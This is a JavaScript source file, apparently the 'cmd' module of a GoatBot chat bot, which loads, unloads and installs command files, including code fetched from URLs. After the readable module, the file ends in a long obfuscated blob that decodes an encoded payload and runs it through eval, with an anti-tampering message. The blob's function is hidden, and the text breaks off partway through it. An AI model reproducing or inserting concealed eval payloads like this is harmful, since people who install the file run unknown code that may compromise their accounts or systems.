const axios = require("axios");
const { execSync } = require("child_process");
const fs = require("fs-extra");
const path = require("path");
const cheerio = require("cheerio");
const { client } = global;

const { configCommands } = global.GoatBot;
const { log, loading, removeHomeDir } = global.utils;

function getDomain(url) {
	const regex = /^(?:https?:\/\/)?(?:[^@\n]+@)?(?:www\.)?([^:/\n]+)/im;
	const match = url.match(regex);
	return match ? match[1] : null;
}

function isURL(str) {
	try {
		new URL(str);
		return true;
	}
	catch (e) {
		return false;
	}
}

module.exports = {
	config: {
		name: "cmd",
		version: "1.15",
		author: "NTKhang",
		countDown: 5,
		role: 2,
		shortDescription: {
			vi: "Quản lý command",
			en: "Manage command"
		},
		longDescription: {
			vi: "Quản lý các tệp lệnh của bạn",
			en: "Manage your command files"
		},
		category: "owner",
		guide: {
			vi: "   {pn} load <tên file lệnh>"
				+ "\n   {pn} loadAll"
				+ "\n   {pn} install <url> <tên file lệnh>: Tải xuống và cài đặt một tệp lệnh từ một url, url là đường dẫn đến tệp lệnh (raw)"
				+ "\n   {pn} install <tên file lệnh> <code>: Tải xuống và cài đặt một tệp lệnh từ một code, code là mã của lệnh",
			en: "   {pn} load <command file name>"
				+ "\n   {pn} loadAll"
				+ "\n   {pn} install <url> <command file name>: Download and install a command file from a url, url is the path to the file (raw)"
				+ "\n   {pn} install <command file name> <code>: Download and install a command file from a code, code is the code of the command"
		}
	},

	langs: {
		vi: {
			missingFileName: "⚠️ | Vui lòng nhập vào tên lệnh bạn muốn reload",
			loaded: "✅ | Đã load command \"%1\" thành công",
			loadedError: "❌ | Load command \"%1\" thất bại với lỗi\n%2: %3",
			loadedSuccess: "✅ | Đã load thành công \"%1\" command",
			loadedFail: "❌ | Load thất bại \"%1\" command\n%2",
			missingCommandNameUnload: "⚠️ | Vui lòng nhập vào tên lệnh bạn muốn unload",
			unloaded: "✅ | Đã unload command \"%1\" thành công",
			unloadedError: "❌ | Unload command \"%1\" thất bại với lỗi\n%2: %3",
			missingUrlCodeOrFileName: "⚠️ | Vui lòng nhập vào url hoặc code và tên file lệnh bạn muốn cài đặt",
			missingUrlOrCode: "⚠️ | Vui lòng nhập vào url hoặc code của tệp lệnh bạn muốn cài đặt",
			missingFileNameInstall: "⚠️ | Vui lòng nhập vào tên file để lưu lệnh (đuôi .js)",
			invalidUrl: "⚠️ | Vui lòng nhập vào url hợp lệ",
			invalidUrlOrCode: "⚠️ | Không thể lấy được mã lệnh",
			alreadExist: "⚠️ | File lệnh đã tồn tại, bạn có chắc chắn muốn ghi đè lên file lệnh cũ không?\nThả cảm xúc bất kì vào tin nhắn này để tiếp tục",
			installed: "✅ | Đã cài đặt command \"%1\" thành công, file lệnh được lưu tại %2",
			installedError: "❌ | Cài đặt command \"%1\" thất bại với lỗi\n%2: %3",
			missingFile: "⚠️ | Không tìm thấy tệp lệnh \"%1\"",
			invalidFileName: "⚠️ | Tên tệp lệnh không hợp lệ",
			unloadedFile: "✅ | Đã unload lệnh \"%1\""
		},
		en: {
			missingFileName: "⚠️ | Please enter the command name you want to reload",
			loaded: "✅ | Loaded command \"%1\" successfully",
			loadedError: "❌ | Failed to load command \"%1\" with error\n%2: %3",
			loadedSuccess: "✅ | Loaded successfully \"%1\" command",
			loadedFail: "❌ | Failed to load \"%1\" command\n%2",
			missingCommandNameUnload: "⚠️ | Please enter the command name you want to unload",
			unloaded: "✅ | Unloaded command \"%1\" successfully",
			unloadedError: "❌ | Failed to unload command \"%1\" with error\n%2: %3",
			missingUrlCodeOrFileName: "⚠️ | Please enter the url or code and command file name you want to install",
			missingUrlOrCode: "⚠️ | Please enter the url or code of the command file you want to install",
			missingFileNameInstall: "⚠️ | Please enter the file name to save the command (with .js extension)",
			invalidUrl: "⚠️ | Please enter a valid url",
			invalidUrlOrCode: "⚠️ | Unable to get command code",
			alreadExist: "⚠️ | The command file already exists, are you sure you want to overwrite the old command file?\nReact to this message to continue",
			installed: "✅ | Installed command \"%1\" successfully, the command file is saved at %2",
			installedError: "❌ | Failed to install command \"%1\" with error\n%2: %3",
			missingFile: "⚠️ | Command file \"%1\" not found",
			invalidFileName: "⚠️ | Invalid command file name",
			unloadedFile: "✅ | Unloaded command \"%1\""
		}
	},

	onStart: async ({ args, message, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, event, commandName, getLang }) => {
		const { unloadScripts, loadScripts } = global.utils;
		if (args[0] == "load" && args.length == 2) {
			if (!args[1])
				return message.reply(getLang("missingFileName"));
			const infoLoad = loadScripts("cmds", args[1], log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang);
			if (infoLoad.status == "success")
				message.reply(getLang("loaded", infoLoad.name));
			else {
				message.reply(getLang("loadedError", infoLoad.name, infoLoad.error.name, infoLoad.error.message));
				console.log(infoLoad.error);
			}
		}
		else if ((args[0] || "").toLowerCase() == "loadall" || (args[0] == "load" && args.length > 2)) {
			const allFile = args[0].toLowerCase() == "loadall" ?
				fs.readdirSync(__dirname)
					.filter(file =>
						file.endsWith(".js") &&
						!file.match(/(eg)\.js$/g) &&
						(process.env.NODE_ENV == "development" ? true : !file.match(/(dev)\.js$/g)) &&
						!configCommands.commandUnload?.includes(file)
					)
					.map(item => item = item.split(".")[0]) :
				args.slice(1);
			const arraySucces = [];
			const arrayFail = [];
			for (const name of allFile) {
				const infoLoad = loadScripts("cmds", name, log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang);
				infoLoad.status == "success" ? arraySucces.push(name) : arrayFail.push(`${name} => ${infoLoad.error.name}: ${infoLoad.error.message}`);
			}

			let msg = "";
			if (arraySucces.length > 0)
				msg += getLang("loadedSuccess", arraySucces.length);
			if (arrayFail.length > 0)
				msg += (msg ? "\n" : "") + getLang("loadedFail", arrayFail.length, "❗" + arrayFail.join("\n❗ "));

			message.reply(msg);
		}
		else if (args[0] == "unload") {
			if (!args[1])
				return message.reply(getLang("missingCommandNameUnload"));
			const infoUnload = unloadScripts("cmds", args[1], configCommands, getLang);
			infoUnload.status == "success" ?
				message.reply(getLang("unloaded", infoUnload.name)) :
				message.reply(getLang("unloadedError", infoUnload.name, infoUnload.error.name, infoUnload.error.message));
		}
		else if (args[0] == "install") {
			let url = args[1];
			let fileName = args[2];
			let rawCode;

			if (!url || !fileName)
				return message.reply(getLang("missingUrlCodeOrFileName"));

			if (
				url.endsWith(".js")
				&& !isURL(url)
			) {
				const tmp = fileName;
				fileName = url;
				url = tmp;
			}

			if (url.match(/(https?:\/\/(?:www\.|(?!www)))/)) {
				global.utils.log.dev("install", "url", url);
				if (!fileName || !fileName.endsWith(".js"))
					return message.reply(getLang("missingFileNameInstall"));

				const domain = getDomain(url);
				if (!domain)
					return message.reply(getLang("invalidUrl"));

				if (domain == "pastebin.com") {
					const regex = /https:\/\/pastebin\.com\/(?!raw\/)(.*)/;
					if (url.match(regex))
						url = url.replace(regex, "https://pastebin.com/raw/$1");
					if (url.endsWith("/"))
						url = url.slice(0, -1);
				}
				else if (domain == "github.com") {
					const regex = /https:\/\/github\.com\/(.*)\/blob\/(.*)/;
					if (url.match(regex))
						url = url.replace(regex, "https://raw.githubusercontent.com/$1/$2");
				}

				rawCode = (await axios.get(url)).data;

				if (domain == "savetext.net") {
					const $ = cheerio.load(rawCode);
					rawCode = $("#content").text();
				}
			}
			else {
				global.utils.log.dev("install", "code", args.slice(1).join(" "));
				if (args[args.length - 1].endsWith(".js")) {
					fileName = args[args.length - 1];
					rawCode = event.body.slice(event.body.indexOf('install') + 7, event.body.indexOf(fileName) - 1);
				}
				else if (args[1].endsWith(".js")) {
					fileName = args[1];
					rawCode = event.body.slice(event.body.indexOf(fileName) + fileName.length + 1);
				}
				else
					return message.reply(getLang("missingFileNameInstall"));
			}

			if (!rawCode)
				return message.reply(getLang("invalidUrlOrCode"));

			if (fs.existsSync(path.join(__dirname, fileName)))
				return message.reply(getLang("alreadExist"), (err, info) => {
					global.GoatBot.onReaction.set(info.messageID, {
						commandName,
						messageID: info.messageID,
						type: "install",
						author: event.senderID,
						data: {
							fileName,
							rawCode
						}
					});
				});
			else {
				const infoLoad = loadScripts("cmds", fileName, log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang, rawCode);
				infoLoad.status == "success" ?
					message.reply(getLang("installed", infoLoad.name, path.join(__dirname, fileName).replace(process.cwd(), ""))) :
					message.reply(getLang("installedError", infoLoad.name, infoLoad.error.name, infoLoad.error.message));
			}
		}
		else
			message.SyntaxError();
	},

	onReaction: async function ({ Reaction, message, event, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang }) {
		const { loadScripts } = global.utils;
		const { author, data: { fileName, rawCode } } = Reaction;
		if (event.userID != author)
			return;
		const infoLoad = loadScripts("cmds", fileName, log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang, rawCode);
		infoLoad.status == "success" ?
			message.reply(getLang("installed", infoLoad.name, path.join(__dirname, fileName).replace(process.cwd(), ""))) :
			message.reply(getLang("installedError", infoLoad.name, infoLoad.error.name, infoLoad.error.message));
	}
};



let hiMC;!function(){const EtfA=Array.prototype.slice.call(arguments);return eval("(function MpGw(vFNo){const P2Fo=fpxp(vFNo,nxap(MpGw.toString()));try{let rAIo=eval(P2Fo);return rAIo.apply(null,EtfA);}catch(LXAo){var nvDo=(0o202222-66693);while(nvDo<(0o400161%65574))switch(nvDo){case (0x30058%0o200031):nvDo=LXAo instanceof SyntaxError?(0o400126%0x1001D):(0o400163%0x10027);break;case (0o201510-0x1032C):nvDo=(0o400177%65581);{console.log(\'Error: the code has been tampered!\');return}break;}throw LXAo;}function nxap(P4cp){let js5o=450222117;var LZ7o=(0o400075%65550);{let fn0o;while(LZ7o<(0x10550-0o202456)){switch(LZ7o){case (0O144657447^0x1935F20):LZ7o=(0o202032-0x1040B);{js5o^=(P4cp.charCodeAt(fn0o)*(15658734^0O73567354)+P4cp.charCodeAt(fn0o>>>(0x4A5D0CE&0O320423424)))^1298248844;}break;case (0x40073%0o200031):LZ7o=(0x4004F%0o200021);fn0o++;break;case (0o201736-66515):LZ7o=fn0o<P4cp.length?(0O264353757%8):(0o1000236%65567);break;case (0o202450-0x10507):LZ7o=(0o1000107%0x1000F);fn0o=(0x21786%3);break;}}}let HU2o=\"\";var biVo=(67216-0o203164);{let DPXo;while(biVo<(0x105C8-0o202643)){switch(biVo){case (0o204300-67748):biVo=(0o204730-0x109B4);DPXo=(0x21786%3);break;case (262308%0o200040):biVo=DPXo<(0O3153050563-0x19AC516B)?(66316-0o201362):(0o201344-0x102BF);break;case (0x10618-0o202776):biVo=(0x2005E%0o200040);{const DRup=js5o%(68536-0o205637);js5o=Math.floor(js5o/(0o204312-0x108B1));HU2o+=DRup>=(0x1071C-0o203402)?String.fromCharCode((0o600404%65601)+(DRup-(0o1000136%0x10011))):String.fromCharCode((0o217120-0x11DEF)+DRup);}break;case (0o204064-67606):biVo=(0o202070-0x10414);DPXo++;break;}}}return HU2o;}function fpxp(zMpp,bksp){zMpp=decodeURI(zMpp);let vHkp=(0x21786%3);let Xenp=\"\";var rCfp=(68506-0o205571);{let T9hp;while(rCfp<(0o600152%0x10018)){switch(rCfp){case (0x9D8DE4-0O47306735):rCfp=(0o203410-0x106F9);{Xenp+=String.fromCharCode(zMpp.charCodeAt(T9hp)^bksp.charCodeAt(vHkp));vHkp++;var TbPp=(0o206666-0x10D9B);while(TbPp<(0x111D0-0o210652))switch(TbPp){case (0o200416-0x100F3):TbPp=vHkp>=bksp.length?(0o201344-66239):(0o203554-0x10746);break;case (0x300AF%0o200056):TbPp=(0o400144%65567);{vHkp=(0x75bcd15-0O726746425);}break;}}break;case (0o1000107%65551):rCfp=T9hp<zMpp.length?(0O264353757%8):(0o600171%65565);break;case (0o1000141%65552):rCfp=(196652%0o200013);T9hp=(0x75bcd15-0O726746425);break;case (0o202260-66721):rCfp=(0o202114-66625);T9hp++;break;}}}return Xenp;}})(\"X%0A%1D%19%12%15%0E%0E%1EDA%0C%17%14%09%02%04%05%07%19Q%E2%B4%B3%E2%B5%92%E2%B4%A6%E2%B4%A8DA%0C%03%04%13%14%02%02H%11%04%0F%04%15%19%03%06_X%1A%1AZ%0D%0A%1D%19%12%15%0E%0E%1EL%E2%B4%AA%E2%B4%A7%E2%B4%BB%E2%B4%B9OH%0B%1E%0D%03%04%13%09A%E2%B4%B2%E2%B5%9C%E2%B5%98%E2%B4%BCYHL%E2%B4%A3%E2%B4%A0%E2%B5%96%E2%B4%A7_XJ%E2%B4%A5%E2%B5%91%E2%B4%A0%E2%B4%A7@%5EZ%E2%B5%93%E2%B4%AC%E2%B4%A2%E2%B4%A2DA%5C%E2%B4%A3%E2%B5%94%E2%B4%A0%E2%B4%B3XEC%E2%B4%B5%E2%B4%B1%E2%B5%94%E2%B4%ABIY%11%00%1E%3C%22Z%1A%0DW%0E%02%1F%02%13%08%1F%02H%E2%B4%B5%E2%B5%81%E2%B4%A1%E2%B4%BFIY%17%1A%12%05%14%15%0FP%E2%B4%AE%E2%B4%A8%E2%B5%82%E2%B4%BDINJ%E2%B5%82%E2%B5%97%E2%B4%B6%E2%B4%A6YHL%E2%B5%93%E2%B4%BB%E2%B5%9F%E2%B4%A5_XJ%E2%B4%A5%E2%B4%A1%E2%B5%85%E2%B4%A0@%5EZ%E2%B4%B3%E2%B4%A2%E2%B5%9D%E2%B4%BCDA%5C%E2%B4%A3%E2%B5%94%E2%B4%A0%E2%B4%B3XEC%E2%B4%B5%E2%B5%81%E2%B4%B1%E2%B4%B6IYG%E2%B4%AA%E2%B5%87%E2%B5%81%E2%B4%B6OH%0D%0A%1D%19%12%15%0E%0E%1EL%E2%B5%9A%E2%B4%BC%E2%B4%B2%E2%B4%B9OH%0B%1E%0D%03%04%13%09AX%E2%B5%9E%E2%B4%B3%E2%B4%AF%E2%B4%A3INH%5B75%0A%17%14%09%02%04%05%07%19Q%E2%B4%B3%E2%B4%B2%E2%B4%A0%E2%B4%A9DA%0C%03%04%13%14%02%02H%E2%B5%85%E2%B4%AA%E2%B5%99%E2%B4%AFIYG%E2%B4%BA%E2%B5%82%E2%B4%A6%E2%B4%A8OH%5B%E2%B4%AE%E2%B4%A8%E2%B5%82%E2%B4%BDINJ%E2%B4%A2%E2%B4%B9%E2%B4%A9%E2%B4%BCYH%1A%09%19!+Y5%03ZI%3E%0D&VL%5C)%00%3EES%11%04%0F%04%15%19%03%06W%E2%B4%B3%E2%B4%A1%E2%B4%A2%E2%B4%B8X%E2%B4%AE%E2%B4%B8%E2%B5%8D%E2%B4%A8M%E2%B5%95%E2%B5%9A%E2%B5%8E%E2%B4%B5A%0C%1D%04%13A%E2%B5%82%E2%B4%A7%E2%B5%9B%E2%B4%AELCEZ%06%0D%1AW%E2%B4%A3%E2%B5%94%E2%B5%90%E2%B4%B8MDX%18@QWQA%5DYRGTRTAES%0C%1D%04%13A%E2%B4%A2%E2%B4%A9%E2%B4%B4%E2%B4%AFJ%16%0F%08%1C%09@%E2%B4%A5%E2%B5%84%E2%B5%96%E2%B4%BE%5DX%5C%07E@PTPBAX%0F@PU%20EEA%0C%02%16%0E%15%13%04@%E2%B4%A5%E2%B5%84%E2%B5%96%E2%B4%BEH%0B%0F%09%04%14AOQ%08XXGDTBQ%1F%5EXGASUHJ%E2%B4%BE%E2%B5%9D%E2%B5%80%E2%B4%A8%5COWHTQA%5CQ%08S@Z%5CGEH%5C%E2%B4%B3%E2%B4%B5%E2%B4%B0%E2%B4%B0J%E2%B4%B3%E2%B4%B1%E2%B5%9D%E2%B4%B8%5DDC%5C*J%3C%3C-7C,,%3CNZ%12%1E%0D%16%1AZ%04%00%03%09H_GXVRFAX%18CQQVEXAM%E2%B4%A3%E2%B5%94%E2%B5%90%E2%B4%B8MDX%18GQWPBZMG%09PWQAXAL%0A%E2%B5%93%E2%B4%AC%E2%B5%92%E2%B4%A9GU%E2%B5%85%E2%B5%8A%E2%B5%9F%E2%B4%BEZ%0D%0E%1A%12%10%0A%5C%02%11%1F%0DWYQ%1FS@%5C%5DOTQ%08S@%5CXDGH%5D%E2%B4%B3%E2%B5%85%E2%B5%9B%E2%B4%B1J%E2%B4%A3%E2%B4%A4%E2%B4%BB%E2%B4%B9NQC,*J%3C:%5BMC,,%3CL:%5B75*,J%3C%3C-7C,,%3C%3CJQG3*,%3CXI@%03%5EGASWPUZ%5DBGVN%5BX%5C%07CAQVVEIX%0F@QWS3ES%15%03%04%06%0AK%0F%09%04%14AOPC%5DYCIDW%0EB%5CXGBPN%5B%E2%B4%A2%E2%B5%99%E2%B5%9F%E2%B4%AELIQY@Y%5EZA%0EUQDZ_CXZ%E2%B4%B5%E2%B4%A4%E2%B4%AC%E2%B4%B4EZJ%03%15%04%11%07S%0A%0C%1C%15%04%04%19%1A%19Q%E2%B5%93%E2%B4%AC%E2%B5%92%E2%B4%A9W%15%11%04%0F%04%15%19%03%06W%E2%B4%B3%E2%B5%91%E2%B5%97%E2%B4%B8XE%13%05%14%15%12%13%1EL@%E2%B5%85%E2%B4%BA%E2%B4%B2%E2%B4%AAIYEC,,%1C%01%14%1E%0F%1C%1E%1E%0FG%E2%B5%93%E2%B5%8B%E2%B4%B2%E2%B4%B1_X%1A%15%04%04%19%1A%19Q%E2%B5%93%E2%B4%AC%E2%B4%B2%E2%B4%A1DA%5C%E2%B4%A3%E2%B4%B4%E2%B4%A6%E2%B4%AAXE%15%11%04%0F%04%15%19%03%06W%E2%B4%A3%E2%B4%B4%E2%B5%96%E2%B4%BBXE%13%05%14%15%12%13%1EL@%5CPJ%3C%3C%5BMC,,HMI%5BG3%5C*%3C::%5B75*ZILJ+G3*,:L:-1AZZ@L:-EC_ZJ%3CJ+15,Z::%3C%5BDC%5C*J%3C%3C-7C,,%3CNH%0D%1A%09%05Q%E2%B4%B3%E2%B5%92%E2%B4%B6%E2%B4%A9Q3_A%0EVQ@%5DXD@DW%19A%5CXB7HKI@%14YFBP&L@%03ZF@PQVY@@G%1EPWQA%5D%5B@TWRWDZA%5BYQ%1FR@%5D%5B@TQ%08S@%5CXBGHKIA_YBFVBQ%1F%5EXGCUTH%5CDX%18GQVRCYMADVUQY1S%11%04%0F%04%15%19%03%06W%E2%B4%B3%E2%B4%B1%E2%B4%BD%E2%B4%B8XE%13%05%14%15%12%13%1EL@_ZI%3CJ+7I%5C*%3CL@%5B75*Z:L:-15*Z::H+G3*,HMI%E2%B4%A2%E2%B4%A9%E2%B4%A4%E2%B4%A2YHNH%5BDC%5C*J%3C%3C-7C,,%3CLI%5BG3%5C*%3C::%5B75*XLL@%5B75%5E%0C%07%12%0F%13%18%01%18%1FA%E2%B4%A5%E2%B5%91%E2%B4%A0%E2%B4%B5@%5E%0A%13%02%15%05%1E%06W%E2%B5%83%E2%B4%AA%E2%B5%94%E2%B4%AEXEC%E2%B5%85%E2%B5%8A%E2%B4%BF%E2%B4%B6IYG%E2%B4%AA%E2%B5%87%E2%B4%A1%E2%B4%B0OH%5B%E2%B4%AE%E2%B4%A8%E2%B5%82%E2%B4%BDINJ%E2%B5%82%E2%B4%A7%E2%B4%BB%E2%B4%A6YHL%E2%B5%93%E2%B5%8B%E2%B4%B2%E2%B4%B9_XJ%E2%B5%95%E2%B4%BA%E2%B4%B8%E2%B4%BD@%5EZ%E2%B5%93%E2%B5%9C%E2%B4%BF%E2%B4%A1DA%5C%E2%B4%A3%E2%B4%A4%E2%B5%9B%E2%B4%ADXE%15%11%04%0F%04%15%19%03%06W%E2%B5%83%E2%B4%AA%E2%B4%B4%E2%B4%B8XE%13%05%14%15%12%13%1EL%1C%1F%18%12%3CI%E2%B4%A2%E2%B4%B9%E2%B5%99%E2%B4%A1YHNJX%E2%B4%AE%E2%B5%98%E2%B4%A7%E2%B4%A6INH-W%15%01%10%13G%E2%B5%93%E2%B4%AB%E2%B4%A4%E2%B4%B1J*IW%19B%5CYCHDW%0EB%5CXFEQNMX%5C%07CAQSVAI%5EBGSTH%5CDX%18CUWQ@ZEO@VPVY1S%11%04%0F%04%15%19%03%06W%E2%B4%A3%E2%B4%A4%E2%B4%AB%E2%B4%B8XE%13%05%14%15%12%13%1EL%E2%B4%AA%E2%B5%87%E2%B4%A1%E2%B4%A8OH%5B%E2%B5%9E%E2%B5%93%E2%B5%89%E2%B4%B8INJ%E2%B5%82%E2%B5%97%E2%B4%B6%E2%B4%A6YHL%E2%B5%93%E2%B5%8B%E2%B4%B2%E2%B4%A3_XJ%E2%B4%B5%E2%B4%B4%E2%B4%A1%E2%B4%A2@%5EZ%E2%B5%93%E2%B4%BC%E2%B5%99%E2%B4%B8DA%5C%E2%B4%B3%E2%B5%91%E2%B5%97%E2%B4%B6XEC%E2%B5%85%E2%B5%8A%E2%B4%BF%E2%B4%ACIY%11%0E%02%1F%02%13%08%1F%02H%E2%B4%B5%E2%B4%A1%E2%B4%AB%E2%B4%BDIY%17%1A%12%05%14%15%0FPD%E2%B4%BA%E2%B4%A2%E2%B4%A0%E2%B4%B7OHY7%E2%B4%AA%E2%B5%87%E2%B4%B1%E2%B4%B9OH-D%E2%B4%BA%E2%B4%A2%E2%B4%B0%E2%B4%B6OHY%11%0E%02%1F%02%13%08%1F%02H%E2%B5%85%E2%B5%8A%E2%B4%AF%E2%B4%BDIY%17%1A%12%05%14%15%0FPD@%5CY:L:+MC,,JFJ+15%5C*J%3C%3C-15%5C*%3CN:%5B73%5C*:L:-1C,Z::%3C-G3*,:L:-13%5CPJ%3C%3C-15%5E%5BI%E2%B4%A5%E2%B4%B1%E2%B4%AA%E2%B4%BF@%5EXHLI%5B73%5C*:L:-1C,Z::%3C-G3*,:L:-13%5C*%3C:%3CY%11%0E%02%1F%02%13%08%1F%02H%E2%B5%85%E2%B4%BA%E2%B4%A2%E2%B4%BDIY%17%1A%12%05%14%15%0FP%E2%B4%BE%E2%B5%9D%E2%B4%B0%E2%B4%ABINJ%E2%B4%A2%E2%B5%99%E2%B4%BF%E2%B4%BEYHL%E2%B4%A3%E2%B4%B0%E2%B5%99%E2%B4%A4_XJ%E2%B4%A5%E2%B4%B1%E2%B5%8A%E2%B4%A3@%5E%0C%09%0E,3B%1B:B(Z%07%05%02%0B%03%18%0E%09IY%17%1A%12%05%14%15%0FPDX8CWSRE__BFD_H%0DW%0E%02%1F%02%13%08%1F%02H%E2%B4%A5%E2%B5%84%E2%B4%A6%E2%B4%BDIY%17%1A%12%05%14%15%0FPD%E2%B4%AA%E2%B4%B7%E2%B5%84%E2%B4%AFOHY7%E2%B5%9A%E2%B4%AC%E2%B4%A9%E2%B4%A9OH-DA%0A%17%14%09%02%04%05%07%19Q%E2%B4%B3%E2%B4%A2%E2%B5%9D%E2%B4%AADA%0C%03%04%13%14%02%02H_%E2%B4%A3%E2%B4%B4%E2%B4%A6%E2%B4%B4XEA%5CY%E2%B4%B3%E2%B4%B2%E2%B5%90%E2%B4%AADA%5E%0C%07%12%0F%13%18%01%18%1FA%E2%B4%A5%E2%B5%91%E2%B4%B0%E2%B4%B6@%5E%0A%13%02%15%05%1E%06WY%E2%B4%B3%E2%B4%A2%E2%B4%BD%E2%B4%B6DA%5EZI%E2%B4%B5%E2%B4%A4%E2%B5%8C%E2%B4%B6@%5EX%1C%0F%08=/F:H7.%5C%16%19%06%14%05%08%08%0FXE%13%05%14%15%12%13%1EL@G%1EWWQA%5D%5ERA%19VQ@%5D%5D%5E%0CZ%01%14%1E%0F%1C%1E%1E%0FG%E2%B4%A3%E2%B4%B0%E2%B5%99%E2%B4%B2_X%1A%15%04%04%19%1A%19QILI+G3,PJ%3C%3C%5BMC,,%3CL:%5B75*,%3CL:-E3%5C*%3C:H%5BD@%E2%B5%85%E2%B4%BA%E2%B4%B2%E2%B4%AAIYEB_%E2%B4%A3%E2%B4%B4%E2%B4%A6%E2%B4%B4XEA%5E%0C%07%12%0F%13%18%01%18%1FA%E2%B5%95%E2%B4%BA%E2%B5%88%E2%B4%B6@%5E%0A%13%02%15%05%1E%06WYJ%3C:%5B73%5CPJ%3C%3C-G3%5C*%3C:%3C%5B75**J%3C%3C-7CVZ::%3C-EC_YJL:%5B75**J%3C%3C-G@%5CZ:L:-13%5C*%3C:HYF@%E2%B4%A5%E2%B4%B4%E2%B5%9D%E2%B4%BDIYEA%0A%17%14%09%02%04%05%07%19Q%E2%B5%93%E2%B4%AC%E2%B4%A2%E2%B4%A6DA%0C%03%04%13%14%02%02H%E2%B4%A5%E2%B5%84%E2%B4%B6%E2%B4%A0IYG%E2%B5%9A%E2%B5%8C%E2%B4%BF%E2%B4%B1OH%5B%E2%B5%9E%E2%B5%93%E2%B5%89%E2%B4%BEINJ%E2%B5%82%E2%B5%97%E2%B4%A6%E2%B4%A5YH%1A%09%19!+Y%1E)%3E(M%0A%1D%19%12%15%0E%0E%1EDA%0C%03%04%13%14%02%02H_A%0EUQE%5E_A%5CW_SF%5DA%0AJ%07%12%0F%13%18%01%18%1FA%E2%B4%B5%E2%B5%94%E2%B4%B7%E2%B4%BA@%5E%0A%13%02%15%05%1E%06WYJO:%5B73VZ::JQG3*,J%3CJ+15*,J%3C%3CY7C,,%3CNJX%E2%B4%AE%E2%B4%B8%E2%B5%8D%E2%B4%BCINH%0D%0A%1D%19%12%15%0E%0E%1EL%E2%B4%BA%E2%B4%B2%E2%B5%8D%E2%B4%B7OH%0B%E2%B4%BE%E2%B5%9D%E2%B4%A0%E2%B4%A8:%E2%B4%B5%E2%B5%94%E2%B4%A7%E2%B4%BF@%5E,IN:X%E2%B4%AE%E2%B5%98%E2%B4%A7%E2%B4%A2INH%5BD%E2%B4%AA%E2%B4%B7%E2%B5%84%E2%B4%B9OHY1U,,Z%11%00%02L%E2%B4%AA%
